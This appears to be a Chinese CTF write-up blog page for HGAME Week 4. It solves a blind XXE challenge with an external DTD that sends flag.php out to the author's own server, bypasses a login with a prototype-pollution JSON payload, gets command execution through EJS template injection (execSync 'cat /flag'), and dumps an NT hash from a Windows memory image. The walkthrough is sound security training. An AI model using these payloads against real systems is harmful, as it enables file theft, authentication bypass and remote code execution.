@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  
+  
+  <title>HGAME 2022 Week4 writeup by ripple | ripple</title>
+  <meta name="author" content="rippleQAQ" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="" />
+  
+  <meta name="description" content="HGAME 2022 Week4 writeup by rippleWebTell Me我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HGAME 2022 Week4 writeup by ripple">
+<meta property="og:url" content="https://rippleqaq.github.io/2023/02/03/HGAME-Week4/index.html">
+<meta property="og:site_name" content="ripple">
+<meta property="og:description" content="HGAME 2022 Week4 writeup by rippleWebTell Me我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week4/hint.png">
+<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week4/send.png">
+<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week4/bpsend.png">
+<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week4/flag-base64.png">
+<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week4/merge.png">
+<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week4/proto.png">
+<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week4/isadmin.png">
+<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week4/login.png">
+<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week4/flag.png">
+<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week4/way1.png">
+<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week4/envars.png">
+<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week4/flag2QAQ.png">
+<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week4/nthash.png">
+<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week4/dumpme.png">
+<meta property="og:image" content="https://rippleqaq.github.io/static/HGAME-Week4/win.png">
+<meta property="article:published_time" content="2023-02-02T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-08-02T05:04:04.420Z">
+<meta property="article:author" content="rippleQAQ">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rippleqaq.github.io/static/HGAME-Week4/hint.png">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
+    <script src="/js/kr-dark.min.js"></script>
+  
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" media="all"></script>
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
+  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/banner.webp');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/bg.webp');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                    
+                                        
+                                            <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/friends/"><i class="fa fa-paw"></i>好伙伴</a></li>
+                                        
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">ripple</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>ripple</h2> <br />
+                        <span></span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article itemscope itemtype="https://schema.org/Article">
+    
+    <link itemprop="mainEntityOfPage" href="https://rippleqaq.github.io/2023/02/03/HGAME-Week4/">
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center" itemprop="name headline">HGAME 2022 Week4 writeup by ripple</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><time datetime="2023-02-02T16:00:00.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2023-02-03</time></li>
+                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
+                    <i class="fa fa-user"></i> 作者 <span itemprop="name">rippleQAQ</span>
+                </li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~4.45K
+                    
+                    字
+                </li>
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                <div class="icon"><i class="fa fa-warning"></i></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1690952644420"></time> 前，其中的内容可能需要更新。</p></div>
+            </div>
+            
+            
+            
+                <div class="kratos-post-inner-toc toc-div-class" >
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HGAME-2022-Week4-writeup-by-ripple"><span class="toc-number">1.</span> <span class="toc-text">HGAME 2022 Week4 writeup by ripple</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tell-Me"><span class="toc-number">1.1.1.</span> <span class="toc-text">Tell Me</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shared-Diary"><span class="toc-number">1.1.2.</span> <span class="toc-text">Shared Diary</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">1.2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezWin-variables"><span class="toc-number">1.2.1.</span> <span class="toc-text">ezWin - variables</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezWin-auth"><span class="toc-number">1.2.2.</span> <span class="toc-text">ezWin - auth</span></a></li></ol></li></ol></li></ol>
+                </div>
+            
+            <hr />
+            <div itemprop="articleBody"><h1 id="HGAME-2022-Week4-writeup-by-ripple"><a href="#HGAME-2022-Week4-writeup-by-ripple" class="headerlink" title="HGAME 2022 Week4 writeup by ripple"></a>HGAME 2022 Week4 writeup by ripple</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Tell-Me"><a href="#Tell-Me" class="headerlink" title="Tell Me"></a>Tell Me</h3><p>我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机</p>
+<p>其实这题不算难，只需要有个服务器就行，搭网站还是痛并快乐着的。（😎–&gt;👌🕶️–&gt;😭）</p>
+<p>开启题目环境，F12后发现hint</p>
+<p><img src="/static/HGAME-Week4/hint.png"></p>
+<p>看来时可能有源码泄露。</p>
+<p>访问/<a target="_blank" rel="noopener" href="http://www.zip得到源码./">www.zip得到源码。</a></p>
+<p>看文件可以猜到flag.php与send.php和index.php在同一目录下。</p>
+<p>审计send.php中的内容，可以发现有XXE漏洞。</p>
+<p><img src="/static/HGAME-Week4/send.png"></p>
+<p>而且是一个XXE盲注，在后面的过程中也可以发现。</p>
+<p>参考了文章：<a target="_blank" rel="noopener" href="https://blog.szfszf.top/tech/blind-xxe-%E8%AF%A6%E8%A7%A3-google-ctf-%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/">Blind XXE 详解 + Google CTF 一道题目分析</a></p>
+<p>这个大佬讲的很好。</p>
+<p>先去整了一个服务器，安装了apache等一些包，然后配置了一个80/80端口。传一个test.dtd文件到/var/www/html目录下</p>
+<p>内容为：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://my_ip:10001/?%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%start;</span><br></pre></td></tr></table></figure>
+
+<p>其中my_ip是服务器公网ip。</p>
+<p>（这里轻描淡写的几句整了好久哇QAQ，我一定要换Linux主力机）</p>
+<p>自己访问my_ip/test.dtd发现可以下载文件说明可用了。</p>
+<p>burpsuite抓包，添加XML语句：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://my_ip/test.dtd&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/flag.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %remote;</span></span><br><span class="line"><span class="meta">    %send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中my_ip是服务器公网ip。</p>
+<p><img src="/static/HGAME-Week4/bpsend.png"></p>
+<p>发送后等待一会儿，返回了flag.php的base64的编码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgDQogICAgJGZsYWcxID0gImhnYW1le0JlX0F3YXJlXzBmX1hYZUJsMW5kMW5qZWN0aTBufSI7DQo/Pg==</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/static/HGAME-Week4/flag-base64.png"></p>
+<p>解码得到flag.php，里面就是flag:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$flag1</span> = <span class="string">&quot;hgame&#123;Be_Aware_0f_XXeBl1nd1njecti0n&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>flag:<strong>hgame{Be_Aware_0f_XXeBl1nd1njecti0n}</strong></p>
+<h3 id="Shared-Diary"><a href="#Shared-Diary" class="headerlink" title="Shared Diary"></a>Shared Diary</h3><p>考察js原型链污染与ejs模板注入。</p>
+<p>这题折磨了好久，主要原因是对漏洞的原理不清以及开发基础太差。看到什么就自以为是的乱做题目，不理智分析，白白浪费好多时间，值得反思！</p>
+<p>附件里有源码，可以知道flag在服务器上，要RCE到flag。</p>
+<p>打开题目环境，顺便输入，显示<strong>Login as admin or don’t touch my shared diary!</strong></p>
+<p>再看源码：</p>
+<p><img src="/static/HGAME-Week4/merge.png"></p>
+<p>发现这里使用了可以导致原型链污染的函数merge。</p>
+<p>关于原型链的污染参考了：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1880443">原型链漏洞</a></p>
+<p>这里用VScode调试一下更清楚，参考了网站：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/264966.html">Node.js原型链污染的利用</a>学习调试。</p>
+<p>具体就不多说了，这里要注意要绕过一下__proto__，用constructor加上prototype一起绕过。</p>
+<p>附上询问学长时得到的图片帮助理解：</p>
+<p><img src="/static/HGAME-Week4/proto.png"></p>
+<p>结合源码中的判断是否为admin的语句：</p>
+<p><img src="/static/HGAME-Week4/isadmin.png"></p>
+<p>最终构造的payload为：**{“constructor”: {“prototype”: {“data”:{“username”:1},”role”: “admin”}}}**</p>
+<p>记得把Content-Type里面的application/x-www-form-urlencoded改为application/json</p>
+<p>附上成功绕过的报文：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /login HTTP/1.1</span><br><span class="line">Host: week-4.hgame.lwsec.cn:31097</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 25</span><br><span class="line">Origin: http://week-4.hgame.lwsec.cn:31097</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://week-4.hgame.lwsec.cn:31097/login</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;data&quot;:&#123;&quot;username&quot;:1&#125;,&quot;role&quot;: &quot;admin&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>成功绕过登录：</p>
+<p><img src="/static/HGAME-Week4/login.png"></p>
+<p>一开始真的时太想当然了，还以为是XSS，这里既没有bot，又不是得到什么cookie的。</p>
+<p>后来学长提示是存在SSTI的点，但又蠢了，看网上什么ejs+原型链污染组合拳获取shell，又在那搞原型链污染了。。。</p>
+<p>最后其实就是用这个SSTI的点来ejs模板注入实现RCE。这里太想当然了。</p>
+<p>ejs模板就是类似&lt;%- %&gt;</p>
+<p>Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。</p>
+<p>payload:</p>
+<p><strong>&lt;%- global.process.mainModule.constructor._load(‘child_process’).execSync(‘cat<br>/flag’)%&gt;</strong></p>
+<p>输入后即可得到flag。</p>
+<p><img src="/static/HGAME-Week4/flag.png"></p>
+<p>flag:<strong>hgame{N0tice_prototype_pollution&amp;&amp;EJS_server_template_injection}</strong></p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="ezWin-variables"><a href="#ezWin-variables" class="headerlink" title="ezWin - variables"></a>ezWin - variables</h3><p>windows取证，利用volatility3。</p>
+<p>学习参考了<a target="_blank" rel="noopener" href="https://blog.csdn.net/Aluxian_/article/details/127064750">Volatility3内存取证工具使用详解</a>。</p>
+<p>下载附件是windows的镜像文件。三个题是同一个文件，只做了两个出来QAQ。</p>
+<p>这题是找环境变量，比较简单。</p>
+<p>方法一：直接用16进制编译器打开文件，搜索hgame。</p>
+<p><img src="/static/HGAME-Week4/way1.png"></p>
+<p>得到flag。</p>
+<p>方法二：用volatility3分析找到所有环境变量。</p>
+<p>下载volatility3，把要分析的文件放在同一文件夹下。cmd进入文件夹，执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f win10_22h2_19045.2486.vmem windows.envars</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/static/HGAME-Week4/envars.png"></p>
+<p>得到flag。</p>
+<p>flag:<strong>hgame{2109fbfd-a951-4cc3-b56e-f0832eb303e1}</strong></p>
+<h3 id="ezWin-auth"><a href="#ezWin-auth" class="headerlink" title="ezWin - auth"></a>ezWin - auth</h3><p>执行代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f win10_22h2_19045.2486.vmem windows.cmdline</span><br></pre></td></tr></table></figure>
+
+<p>列出进程命令行参数</p>
+<p>发现提示：<strong>flag2 is nthash of current user</strong></p>
+<p><img src="/static/HGAME-Week4/flag2QAQ.png"></p>
+<p>再执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f win10_22h2_19045.2486.vmem windows.hashdump</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/static/HGAME-Week4/nthash.png"></p>
+<p>当前的user是Noname，可以从先前的HOMEPATH是\Users\Noname看出，nthash是84b0d9c9f830238933e7131d60ac6436</p>
+<p>这里就有点瞎猫碰上死耗子了，看到有个nthash，抱着试一试的心态裹了一个hgame{}，没想到真是flag。</p>
+<p>flag:<strong>hgame{84b0d9c9f830238933e7131d60ac6436}</strong></p>
+<p>再第三个7zip就不会了，但找到了一个线索??(可能)</p>
+<p>有个dumpme!!!!!!!.exe</p>
+<p><img src="/static/HGAME-Week4/dumpme.png"></p>
+<p>还有就是发现了flag.7z这个文件</p>
+<p><img src="/static/HGAME-Week4/win.png"></p>
+<p>学艺不精，不会了。QAQ</p>
+<p>第一次接触取证，感觉还是很有意思的！</p>
+<p>WP结束了。HGAME也结束了，下面就是一些感想：</p>
+<p>长一个月的HGAME结束了。感想很多。有做不出题目的坐牢与折磨，也有出flag时的激动与狂喜。</p>
+<p>几乎每个题目都是我不会的知识点，现学现买。后面也都是各个学长学姐批评指点鼓励帮助下慢慢前进，真的非常感动与感谢！</p>
+<p>之前做re有个题，学长和我说了编译优化（编译后为了加快数据的初始化速度就4字节一初始化）这个词，后来刷视频刷到个美女视频，PS痕迹比较多、妆比较浓，下意识第一的反应就是：这编译优化开的有点高啊。然后反应过来一个人傻笑了好久。</p>
+<p>crypto有个RSA大冒险2最后一关是泄露p高位，但泄露的很少，网上抄的脚本不够出，那天挂了一夜脚本第二天起来一看还没跑出来，很是绝望，原理不懂不知道怎么改，难受了很久。</p>
+<p>刚开始打比赛那几天都没睡安稳，晚上总觉得脑子在转想题目，有次做梦梦到一个题目关键，一起来一回忆，是什么只要让美羊羊带着沸羊羊开车去狼堡这题就出来了（可能因为当天刷了B站那个“阿里嘎多美羊羊桑”系列视频，整的梦都抽象了）。</p>
+<p>Web收获最大，后面每题都是新知识点，在学长帮助下摸着石头过河，同时也意识到了自己许许多多的不足之处。学学学！！！</p>
+<p>总之非常感谢有HGAME这样的一个机会，感谢学长学姐的热情指点！！！</p>
+<p>也发现大佬是真的多且强大啊啊啊啊QAQQAQQAQ</p>
+</div>
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <h5 itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "https://rippleqaq.github.io/2023/02/03/HGAME-Week4/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "https://rippleqaq.github.io/2023/02/03/HGAME-Week4/";
+            const title         = "「HGAME 2022 Week4 writeup by ripple」";
+            const excerpt       = `HGAME 2022 Week4 writeup by rippleWebTell Me我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Lin...`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    
+                </div>
+                <div class="pull-date">
+                    <time datetime="2023-08-02T05:04:04.420Z" itemprop="dateModified">最后编辑：2023-08-02</time>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" HGAME 2022 Week3 writeup by ripple" href="/2023/01/29/HGAME-Week3/">&lt; 上一篇</a>
+            </div>
+            
+            
+            <div class="nav-next clearfix">
+                <a title=" HGAME 2022 Week1 writeup by ripple" href="/2023/02/08/HGAME-Week1/">下一篇 &gt;</a>
+            </div>
+            
+        </nav>
+    
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/static/1.jpg" loading="lazy" decoding="auto" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center"></p>
+    </div>
+    <div class="site-meta">
+        <a class="meta-item" href="/archives/">
+            <span class="title">
+                文章
+            </span>
+            <span class="count">
+                16
+            </span>
+        </a>
+        <a class="meta-item" href="/categories/">
+            <span class="title">
+                分类
+            </span>
+            <span class="count">
+                5
+            </span>
+        </a>
+        <a class="meta-item" href="/tags/">
+            <span class="title">
+                标签
+            </span>
+            <span class="count">
+                0
+            </span>
+        </a>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix toc-div-class" >
+    <div class="photo-background"></div>
+    <h4 class="widget-title no-after">
+        <i class="fa fa-compass"></i>
+        文章目录
+        <span class="toc-progress-bar" role="progressbar" aria-label="阅读进度："></span>
+    </h4>
+    <div class="textwidget">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HGAME-2022-Week4-writeup-by-ripple"><span class="toc-text">HGAME 2022 Week4 writeup by ripple</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tell-Me"><span class="toc-text">Tell Me</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shared-Diary"><span class="toc-text">Shared Diary</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezWin-variables"><span class="toc-text">ezWin - variables</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezWin-auth"><span class="toc-text">ezWin - auth</span></a></li></ol></li></ol></li></ol>
+    </div>
+</aside>
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/match/">match</a><span class="category-list-count">6</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/blog/">blog</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/flask/">flask</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><span class="category-list-count">2</span></li></ul>
+  </aside>
+
+
+            
+                
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2023/09/21/blog_demain_deploy/"><i class="fa  fa-book"></i> 为博客设置个人域名</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2023/04/04/flask_variable/"><i class="fa  fa-book"></i> flask路由与视图映射与传参规则</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2023/03/11/HGAME-Final/"><i class="fa  fa-book"></i> HGAME 2022 FINAL writeup by ripple</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2023/03/09/build_environment/"><i class="fa  fa-book"></i> linux内基本环境搭建</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2023/02/26/hello_ubuntu/"><i class="fa  fa-book"></i> 双系统的安装，hello linux</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  class="ap-lrc"  >
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                        
+                        
+                        
+                        
+                        
+                        <li><a target="_blank" rel="me" href="https:///@rippleQAQ"><i class="fa fa fa-share-alt-square"></i></a></li>
